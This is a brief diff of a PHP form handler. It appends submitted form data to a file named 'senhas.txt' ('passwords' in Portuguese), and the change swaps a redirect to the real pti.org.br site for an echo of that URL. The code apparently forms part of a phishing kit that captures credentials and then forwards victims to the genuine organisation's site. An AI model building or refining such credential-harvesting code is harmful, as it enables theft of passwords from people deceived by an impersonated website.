@@ -10,8 +10,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Save the form data to a text file
     file_put_contents("senhas.txt", $formData, FILE_APPEND);
 
-    // You can redirect the user to a thank you page or perform other actions here
-    header("Location: https://www.pti.org.br/");
+    // Em vez de redirecionar, retorne a URL
+    echo "https://www.pti.org.br/";
     exit();
 }
 ?>
